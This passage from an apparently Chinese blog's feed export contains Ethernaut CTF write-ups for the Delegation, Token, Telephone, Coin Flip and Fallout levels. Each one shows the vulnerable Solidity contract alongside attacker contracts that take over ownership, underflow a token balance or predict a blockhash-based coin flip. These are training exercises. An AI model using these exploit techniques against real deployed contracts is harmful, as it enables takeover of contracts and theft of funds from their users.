&#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这是常见的delegatecall漏洞，遇到了好几次了，解题思路比较常规。下面介绍两种修改owner的方法：</p><h3 id="合约修改"><a href="#合约修改" class="headerlink" title="合约修改"></a>合约修改</h3><p>具体原理参考：本博客文章[security-15]，一模一样。下面就贴出解题代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">contract Hack&#123;</span><br><span class="line">    function attack() public&#123;</span><br><span class="line">    //题目实例地址</span><br><span class="line">        address(0x73984D4E3b589f9d64D71e7D1bAe2029715C9316).call(abi.encodeWithSignature(&quot;pwn()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们调用attack方法，执行成功，但是owner却没修改，为什么呢？我想了很久，是张学长告诉了我：去区块链浏览器看看执行成功没，然后我一看，果然出问题了：gas不足，失败了。但是为什么remix却显示成功调用了呢？答案：因为是call调用，就算执行失败也不会告诉你</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/06.Delegation/QQ图片20221223002529.png" alt="QQ图片20221223002529"></p><p>所以我们将gas提高了10倍，去区块链浏览器看，这回是真的执行成功了，owner也是真的修改成合约地址了。</p><p>然后我去提交答案，检查结果。然而显示我没有通过检验。又是张学长，他告诉我：这个靶场题目检验的是我钱包地址成为owner，而不是一个合约。（太感谢他了）</p><p>要钱包地址成为owner，那么就不可以用合约进行攻击，要直接用钱包用户直接调用了</p><h3 id="做题：钱包用户修改"><a href="#做题：钱包用户修改" class="headerlink" title="做题：钱包用户修改"></a>做题：钱包用户修改</h3><p>因为要触发delegation的fallback函数，里面代码<code>(bool result,) = address(delegate).delegatecall(msg.data)</code>，那么我们Low level interactions的时候，传入的calldata具有讲究：<strong>传入的是Keccak256之后值的前8位，也就是函数选择器</strong>。</p><p>先计算pwn()的Keccak256值：<code>0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab</code></p><p><img src="/2023/06/23/04.Ethernaut%20CTF/06.Delegation/image-20221223003716137.png" alt="image-20221223003716137"></p><p>然后取前8位：dd3658b（注意：去掉0x）。同理，需要将gas提高，我提高了10倍，这样执行才能成功。如图，owner也被修改为我的钱包地址</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/06.Delegation/image-20221223003748308.png" alt="image-20221223003748308"></p><p>然后检验答案，成功</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/06.Delegation/image-20221223004003850.png" alt="image-20221223004003850"></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>05.Token</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/05.Token/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/05.Token/</url>
      
        <content type="html"><![CDATA[<h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先看编译器版本，<code>^0.6.0</code>，且没用SafeMath库，所以可能出现整数溢出漏洞</p><p>我们想要获取更多的钱，只有transfer这个方法。我们发现<code>balances[msg.sender] - _value &gt;= 0</code>这个代码有问题，满足整数溢出漏洞的情况。他说我们一开始有20代币，然后我将我的钱包地址输入<code>balanceOf(address _owner)</code>，确实有20。然后我认为，只要transfer的_value参数大于20，就会发生整数溢出漏洞，我的钱数就会变得很大。</p><p>然后我就这么操作：</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/05.Token/image-20221222222703408.png" alt="image-20221222222703408"></p><p>但是这样是失败的，我的钱数还是20没变化。分析原因：下面这两行代码，<code>balances[msg.sender] - _value &gt;= 0</code>(20-666溢出了，所以可以通过检测)。然后<code>balances[msg.sender] -= _value</code>，我的钱包20元减去666会溢出变成一个很大的数，但是<code>balances[_to] += _value</code>又往我的钱包加了666，那么再次溢出变回20元。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>为什么会出现这个情况呢？因为我们接收钱的地址<code>_to</code>和<code>msg.sender</code>是一样的，所以钱数不会变。因此我们的<code>_to</code>和msg.sender要设置成不一致的，即：我们可以用合约来调用函数，这样合约就是<code>msg.sender</code>，我的钱包地址是<code>_to</code>，这样就满足了条件</p><h2 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码"></a>攻击代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack&#123;</span><br><span class="line">//题目地址</span><br><span class="line">    Token token = Token(0x11a797d3EA336b54Cd48658F873282E2489AF42b);</span><br><span class="line">    function attack() public&#123;</span><br><span class="line">    //第一个参数是我的钱包地址</span><br><span class="line">        token.transfer(0xd3E65149C212902749D49011B6ab24bba30D97c6, 666);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>获取实例，发起攻击：我的钱包地址20+666=686元</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/05.Token/image-20221222222210939.png" alt="image-20221222222210939"></p><p>同时发现合约的余额变成一个很大的数：<code>0-666=115792089237316195423570985008687907853269984665640564039457584007913129639270</code></p><p><img src="/2023/06/23/04.Ethernaut%20CTF/05.Token/image-20221222223410520.png" alt="image-20221222223410520"></p><p>通过</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/05.Token/image-20221222222028714.png" alt="image-20221222222028714"></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04.Telephone</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/04.Telephone/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/04.Telephone/</url>
      
        <content type="html"><![CDATA[<h1 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>目标：修改owner</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题比较简单，只有一个方法可以修改owner。方法里面只有一个点<code>tx.origin != msg.sender</code>。要判断成功，就要tx.origin不等于msg.sender。那么我们来回顾一下他们两者的区别</p><ul><li>msg.sender：msg.sender 仅会读取上层调用者的地址。</li><li>tx.origin：tx.origin 会读取启动交易的原始地址。</li></ul><p>由下图可以看到，Bob 通过 A 合约调用 B 合约，B 合约又调用 C 合约。对于 C 合约来说，tx.origin 为 Bob ，msg.sender 为 B 合约。对于 B 合约来说， tx.origin 也是 Bob ， msg.sender 为 A 合约，对于 A 合约来说，tx.origin 与 msg.sender 均为 Bob 。这里我们可以得出一个结论：tx.origin 永远都是 EOA 地址，msg.sender 可以为 EOA 也可以为合约地址。</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/04.Telephone/640.jpeg" alt="640"></p><p>这么说，我们不可以直接调用Telephone合约的<code>changeOwner(address _owner)</code>方法，应该写一个合约来间接调用</p><h2 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码"></a>攻击代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack&#123;</span><br><span class="line">    Telephone telephone = Telephone(0x48db2e171B542DDE57f6E3116e42C5D9A5D47334);</span><br><span class="line">    function attack()public&#123;</span><br><span class="line">        telephone.changeOwner(0xd3E65149C212902749D49011B6ab24bba30D97c6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>获取实例并且部署，然后调用attack发起攻击。查看owner，发现成功修改</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/04.Telephone/image-20221222214002420.png" alt="image-20221222214002420"></p><p>通过</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/04.Telephone/image-20221222213641573.png" alt="image-20221222213641573"></p><p><a href="https://ethernaut.openzeppelin.com/level/0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe">原题目地址</a></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.Coin Flip</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/03.Coin%20Flip/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/03.Coin%20Flip/</url>
      
        <content type="html"><![CDATA[<h1 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>通关要求：这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。即：consecutiveWins设置为10</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>老样子先看编译器版本^0.6.0，那么就可能出现整数溢出漏洞。但是我们看到它引用了Safemath库，那么排除整数溢出这个可能了。</p><p>在区块链当中，随机数并不随机，它是伪随机数。在flip方法中，<code>uint256 blockValue = uint256(blockhash(block.number - 1));</code>、<code>uint256 coinFlip = blockValue / FACTOR;</code>、<code>bool side = coinFlip == 1 ? true : false;</code>这三个是核心的猜数代码，其实我们也可以自己来写。这个题目所谓猜数，就是猜经过这三个代码之后出来的结果。然而我们也可以自己运行这个代码来猜数。</p><blockquote><p>别人的分析：<a href="https://thomasxu-blockchain.github.io/2022-11-03-ethernaut01/#03-Coin-Flip">https://thomasxu-blockchain.github.io/2022-11-03-ethernaut01/#03-Coin-Flip</a></p><p>分析flip代码：<code>block.number</code>用来获取当前交易的block编号，减1获取前一个block的编号，而<code>blockhash(id)</code>获取对应id的block的hash值，然后uint256将其转换为16进制对应的数值。其中给的factor是<code>2^(256)/2</code>，所以每次做完除法的结果有一半几率是0，一半是1。</p><p>本题的漏洞就出在通过<code>block.blockhash(block.number - 1)</code>获取负一高度的区块哈希来生成随机数的方式是极易被攻击利用的。</p><p>原理是在区块链中，一个区块包含多个交易，我们可以先运行一下上述除法计算的过程获取结果究竟是0还是1，然后再发送对应的结果过去。区块链中块和块之前的间隔大概有10秒，手动去做会有问题，不能保证我们计算的合约是否和题目运算调用在同一个block上，因此需要写一个攻击合约完成调用。我们在攻击合约中调用题目中的合约，可以保证两个交易一定被打包在同一个区块上，因此它们获取的block.number.sub(1)是一样的。</p><p>其实就是利用了一个区块中可能有多个交易，而我们可以自己创建一个交易，执行与题目中一样的语句后得到的<code>block.number.sub(1)</code>是一样的</p></blockquote><h2 id="攻击代码"><a href="#攻击代码" class="headerlink" title="攻击代码"></a>攻击代码</h2><p>说明：</p><p>attack_1和attack_2是我想在一个while循环里面完成10次猜数操作。但是代码逻辑有错误：因为是同一笔交易，<code>blockValue = uint256(blockhash(block.number - 1))</code>的<code>block.number</code>恒定不变。但是根据题目要求<code>if (lastHash == blockValue) &#123;revert();&#125;</code>则不满足（要求一个区块内只能猜一次）。【solidity中有没有一种内置的方法，是等到下一个区块被挖出来之后，才往下执行？即block.number发生变化再往下执行。答案：单条类EVM链中，原理上无法实现】</p><p>因此我们只能通过attack_3来调用10次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Hack&#123;</span><br><span class="line">    CoinFlip private immutable coinflip;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor(address _name)&#123;</span><br><span class="line">        coinflip = CoinFlip(_name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack_1() external &#123;</span><br><span class="line">        uint count = 0;</span><br><span class="line"></span><br><span class="line">        bool side;</span><br><span class="line">        uint256 blockValue;</span><br><span class="line">        uint256 coinFlip;</span><br><span class="line">        while (count &lt; 10) &#123;//猜10次</span><br><span class="line">            blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">            coinFlip = blockValue / FACTOR;</span><br><span class="line">            side = coinFlip == 1 ? true : false;</span><br><span class="line">            require(coinflip.flip(side),&quot;guess false&quot;);</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack_2() external  &#123;</span><br><span class="line">      uint8 count = 0;</span><br><span class="line">      while (count &lt; 10)&#123;</span><br><span class="line">        bool guess = guess();</span><br><span class="line">        require(coinflip.flip(guess),&quot;guess false&quot;);</span><br><span class="line">        count++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack_3() external&#123;</span><br><span class="line">      bool guess = guess();</span><br><span class="line">      require(coinflip.flip(guess),&quot;guess false&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess() private view returns(bool)&#123;</span><br><span class="line">      uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">      uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">      bool side = coinFlip == 1 ? true : false;</span><br><span class="line">      return side;</span><br><span class="line">    &#125;</span><br><span class="line">    function getConsecutiveWins() public view returns(uint256)&#123;</span><br><span class="line">      return coinflip.consecutiveWins();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>获取题目实例：<code>0x8F1CeDfDe277E9113f1e93C45742dE560B0277c9</code></p><p><img src="https://moe.photo/images/2022/12/22/ad23db7f22e2483c92d99a11f19b5aa8.png" alt></p><p>通过</p><p><img src="https://moe.photo/images/2022/12/22/e26fdb5eb4ac4495b033a4124b66a348.png" alt></p><h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><p>执行attack_3的时候，会出现下图这个提示。但是仍然可以执行成功。</p><p><img src="https://moe.photo/images/2022/12/22/5c126b24424d409db828adb515ca7ab7.png" alt></p><h2 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h2><p>foundry可以模拟区块状态，可以用他来模拟下一个区块挖出来，用一个循环来执行10次。</p><p>大佬介绍：<a href="https://thomasxu-blockchain.github.io/Foundry/">https://thomasxu-blockchain.github.io/Foundry/</a></p><p>foundry主页：<a href="https://book.getfoundry.sh/cheatcodes/">https://book.getfoundry.sh/cheatcodes/</a></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.Fallout</title>
      <link href="/2023/06/23/04.Ethernaut%20CTF/02.Fallout/"/>
      <url>/2023/06/23/04.Ethernaut%20CTF/02.Fallout/</url>
      
        <content type="html"><![CDATA[<h1 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>通关要求：夺取owner</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // constructor </span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>老样子先看编译器版本^0.6.0，那么就可能出现整数溢出漏洞。但是我们看到它引用了Safemath库，那么排除整数溢出这个可能了。</p><p>然后我们看看哪里可以修改owner，嗯，找不到一个方法。嗯？？？<code>function Fal1out()</code>是什么鬼？特么的构造器名字都可以写错。那么这就不是构造器了，这就是一个方法，直接调用就修改了owner了。</p><p>这道题应该是告诉我们，0.8.0之后的版本，构造器是用<code>constructor</code>，而不是这个可能打错字的形式。</p><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>获取题目实例地址，输入到At address，然后调用<code>Fal1out</code>方法。然后调用owner发现，owner已经被修改成我们的地址</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/02.Fallout/image-20221222000232061.png" alt="image-20221222000232061"></p><p>通过</p><p><img src="/2023/06/23/04.Ethernaut%20CTF/02.Fallout/image-20221222000352709.png" alt="image-20221222000352709"></p><h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><ul><li>有人遇到过这个问题吗？题目代码复制过来报错</li><li>引oz的包要加@</li><li>试过了还是不行</li><li>试过了好几个stackoverflow的路径都显示不对</li><li>而且我觉得不可以修改这个源代码，不然题目不认</li><li>只是一个safemath的包，除非题目自己重写了safemath</li><li>你是找0.6的safemath是吧</li><li>你直接放到合约里面去或者放在自己remix目录都行</li></ul><p><img src="/2023/06/23/04.Ethernaut%20CTF/02.Fallout/image-20221222000433290.png" alt="image-20221222000433290"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 